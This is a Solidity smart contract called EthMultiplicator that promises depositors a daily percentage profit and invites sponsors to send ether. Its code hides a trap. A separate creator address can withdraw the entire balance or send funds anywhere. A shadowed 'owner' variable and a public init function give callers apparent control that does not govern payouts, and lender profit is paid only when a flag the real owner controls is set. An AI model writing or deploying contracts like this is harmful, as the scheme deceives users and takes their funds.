pragma solidity ^0.4.17;

contract Owned 
{
    address newOwner;
    address owner = msg.sender;
    address creator = msg.sender;
    
    function changeOwner(address addr)
    public
    {
        if(isOwner())
        {
            newOwner = addr;
        }
    }
    
    function confirmOwner()
    public
    {
        if(msg.sender==newOwner)
        {
            owner=newOwner;
        }
    }
    
    
    function isOwner()
    internal
    constant
    returns(bool)
    {
        return owner == msg.sender;
    }
    
    function WthdrawAllToCreator()
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(this.balance);
        }
    }
    
    function WthdrawToCreator(uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            creator.transfer(val);
        }
    }
    
    function WthdrawTo(address addr,uint val)
    public
    payable
    {
        if(msg.sender==creator)
        {
            addr.transfer(val);
        }
    }
}

contract EthMultiplicator is Owned
{
    address public Manager;
    
    address public NewManager;
    
    address public owner;
    
    uint public SponsorsQty;
    
    uint public CharterCapital;
    
    uint public ClientQty;
    
    uint public PrcntRate = 5;
    
    bool paymentsAllowed;
    
    struct Lender
    {
        uint LastLendTime;
        uint Amount;
        uint Reserved;
    }
    
    mapping (address => uint) public Sponsors;
    
    mapping (address => Lender) public Lenders;
    
    event StartOfPayments(address indexed calledFrom, uint time);
    
    event EndOfPayments(address indexed calledFrom, uint time);
    
    function initEthMultiplicator(address _manager)
    public
    {
        owner = msg.sender;
        Manager = _manager;
    }
    
    function isManager()
    private
    constant
    returns (bool)
    {
        return(msg.sender==Manager);
    }
    
    function canManage()
    private
    constant
    returns (bool)
    {
        return(msg.sender==Manager||msg.sender==owner);
    }
    
    function ChangeManager(address _newManager)
    public
    {
        if(canManage())
        { 
            NewManager = _newManager;
        }
    }

    function ConfirmManager()
    public
    {
        if(msg.sender==NewManager)
        {
            Manager=NewManager;
        }
    }
    
    function StartPaymens()
    public
    {
        if(canManage())
        { 
            AuthorizePayments(true);
            StartOfPayments(msg.sender, now);
        }
    }
    
    function StopPaymens()
    public
    {
        if(canManage())
        { 
            AuthorizePayments(false);
            EndOfPayments(msg.sender, now);
        }
    }
    
    function AuthorizePayments(bool val)
    public
    {
        if(isOwner())
        {
            paymentsAllowed = val;
        }
    }
    
    function SetPrcntRate(uint val)
    public
    {
        if(canManage())
        {
            if(val!=PrcntRate)
            {
                if(val>=1)
                {
                    PrcntRate = val;  
                }
            }
        }
    }
    
    function()
    public
    payable
    {
        ToSponsor();
    }
    
    function ToSponsor() 
    public
    payable
    {
        if(msg.value>= 1 ether)
        {
            if(Sponsors[msg.sender]==0)SponsorsQty++;
            Sponsors[msg.sender]+=msg.value;
            CharterCapital+=msg.value;
        }   
    }
    
    function WithdrawToSponsor(address _addr, uint _wei) 
    public 
    payable
    {
        if(Sponsors[_addr]>0)
        {
            if(isOwner())
            {
                 if(_addr.send(_wei))
                 {
                   if(CharterCapital>=_wei)CharterCapital-=_wei;
                   else CharterCapital=0;
                 }
            }
        }
    }
    
    function Deposit() 
    public 
    payable
    {
        FixProfit();//fix time inside
        Lenders[msg.sender].Amount += msg.value;
    }
    
    function CheckProfit(address addr) 
    public 
    constant 
    returns(uint)
    {
        return ((Lenders[addr].Amount/100)*PrcntRate)*((now-Lenders[addr].LastLendTime)/1 days);
    }
    
    function FixProfit()
    public
    {
        if(Lenders[msg.sender].Amount>0)
        {
            Lenders[msg.sender].Reserved += CheckProfit(msg.sender);
        }
        Lenders[msg.sender].LastLendTime=now;
    }
    
    function WitdrawLenderProfit() 
    public 
    payable
    {
        if(paymentsAllowed)
        {
            FixProfit();
            uint profit = Lenders[msg.sender].Reserved;
            Lenders[msg.sender].Reserved = 0;
            msg.sender.transfer(profit);
        }
    }
    
}